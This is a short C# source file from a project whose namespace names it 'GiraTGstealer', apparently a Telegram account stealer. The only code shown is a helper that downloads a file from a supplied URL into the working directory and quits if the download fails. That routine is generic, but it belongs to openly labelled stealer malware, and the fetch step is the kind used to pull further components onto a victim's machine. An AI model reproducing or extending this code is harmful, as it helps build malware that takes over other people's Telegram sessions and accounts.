using System;
using System.IO;
using System.Net;

namespace GiraTGstealer
{
    internal class core
    {
        public static void LoadRemoteLibrary(string url)
        {
            if (!File.Exists(Path.GetFileName(url))) 
            {
                try
                {
                    WebClient client = new WebClient();
                    client.DownloadFile(url, Path.GetFileName(url));
                }
                catch (WebException)
                {
                    Console.WriteLine("Failed to load libraries");
                    Environment.Exit(1);
                }
            }
        }
    }
}
